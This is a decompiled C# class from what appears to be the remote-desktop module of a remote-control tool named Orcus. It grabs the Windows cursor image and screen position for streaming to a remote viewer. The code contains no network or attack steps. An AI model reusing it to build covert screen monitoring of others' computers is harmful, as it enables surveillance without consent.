using System;
using System.Drawing;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using Orcus.Native;
using Orcus.Shared.Utilities.Compression;

namespace Orcus.Commands.RemoteDesktop;

public class ScreenHelper
{
	private IntPtr _lastCursorHandle;

	private int _screenNumber;

	private Screen _screenInfo;

	private int _cursorHotspotX;

	private int _cursorHotspotY;

	private const int CURSOR_SHOWING = 1;

	public static Bitmap CaptureCursor(out int x, out int y)
	{
		x = 0;
		y = 0;
		CURSORINFO pci = default(CURSORINFO);
		pci.cbSize = Marshal.SizeOf((object)pci);
		if (!NativeMethods.GetCursorInfo(out pci))
		{
			return null;
		}
		if (pci.flags != 1)
		{
			return null;
		}
		ICONINFO iconInfo;
		Bitmap cursorImage = GetCursorImage(pci, out iconInfo);
		x = pci.ptScreenPos.x - iconInfo.xHotspot;
		y = pci.ptScreenPos.y - iconInfo.yHotspot;
		return cursorImage;
	}

	private static Bitmap GetCursorImage(CURSORINFO cursorInfo, out ICONINFO iconInfo)
	{
		//IL_0059: Unknown result type (might be due to invalid IL or missing references)
		//IL_005f: Expected O, but got Unknown
		IntPtr intPtr = NativeMethods.CopyIcon(cursorInfo.hCursor);
		if (intPtr == IntPtr.Zero)
		{
			iconInfo = default(ICONINFO);
			return null;
		}
		if (!NativeMethods.GetIconInfo(intPtr, out iconInfo))
		{
			return null;
		}
		try
		{
			Bitmap val = Image.FromHbitmap(iconInfo.hbmMask);
			try
			{
				if (((Image)val).get_Height() == ((Image)val).get_Width() * 2)
				{
					Bitmap val2 = new Bitmap(((Image)val).get_Width(), ((Image)val).get_Width());
					Graphics val3 = Graphics.FromHwnd(NativeMethods.GetDesktopWindow());
					try
					{
						IntPtr hdc = val3.GetHdc();
						IntPtr intPtr2 = NativeMethods.CreateCompatibleDC(hdc);
						IntPtr hbitmap = val.GetHbitmap();
						IntPtr hObject = NativeMethods.SelectObject(intPtr2, hbitmap);
						Graphics val4 = Graphics.FromImage((Image)(object)val2);
						try
						{
							IntPtr hdc2 = val4.GetHdc();
							NativeMethods.BitBlt(hdc2, 0, 0, 32, 32, intPtr2, 0, 32, TernaryRasterOperations.SRCCOPY);
							NativeMethods.BitBlt(hdc2, 0, 0, 32, 32, intPtr2, 0, 0, TernaryRasterOperations.SRCINVERT);
							val4.ReleaseHdc(hdc2);
						}
						finally
						{
							((IDisposable)val4)?.Dispose();
						}
						NativeMethods.DeleteDC(NativeMethods.SelectObject(intPtr2, hObject));
						NativeMethods.DeleteObject(hbitmap);
						NativeMethods.DeleteDC(intPtr2);
						NativeMethods.DestroyIcon(intPtr);
						val3.ReleaseHdc(hdc);
					}
					finally
					{
						((IDisposable)val3)?.Dispose();
					}
					val2.MakeTransparent(Color.White);
					return val2;
				}
			}
			finally
			{
				((IDisposable)val)?.Dispose();
			}
		}
		finally
		{
			NativeMethods.DeleteObject(iconInfo.hbmColor);
			NativeMethods.DeleteObject(iconInfo.hbmMask);
		}
		Icon val5 = Icon.FromHandle(intPtr);
		try
		{
			Bitmap result = val5.ToBitmap();
			NativeMethods.DestroyIcon(intPtr);
			return result;
		}
		finally
		{
			((IDisposable)val5)?.Dispose();
		}
	}

	public void UpdateCursor(ICursorStreamCodec cursorStreamCodec, int screenNumber)
	{
		CURSORINFO pci = default(CURSORINFO);
		pci.cbSize = Marshal.SizeOf((object)pci);
		if (!NativeMethods.GetCursorInfo(out pci))
		{
			return;
		}
		if (screenNumber != _screenNumber || _screenInfo == null)
		{
			_screenNumber = screenNumber;
			_screenInfo = Screen.get_AllScreens()[screenNumber];
		}
		if (pci.hCursor != _lastCursorHandle || !cursorStreamCodec.get_HasCursorImage())
		{
			ICONINFO iconInfo;
			Bitmap cursorImage = GetCursorImage(pci, out iconInfo);
			if (cursorImage != null)
			{
				cursorStreamCodec.UpdateCursorImage(cursorImage);
			}
			_cursorHotspotX = iconInfo.xHotspot;
			_cursorHotspotY = iconInfo.yHotspot;
			_lastCursorHandle = pci.hCursor;
		}
		int num = pci.ptScreenPos.x - _cursorHotspotX;
		int num2 = pci.ptScreenPos.y - _cursorHotspotY;
		bool flag = pci.flags == 1 && _screenInfo.get_Bounds().Contains(num, num2);
		num -= _screenInfo.get_Bounds().X;
		num2 -= _screenInfo.get_Bounds().Y;
		cursorStreamCodec.UpdateCursorInfo(num, num2, flag);
	}
}
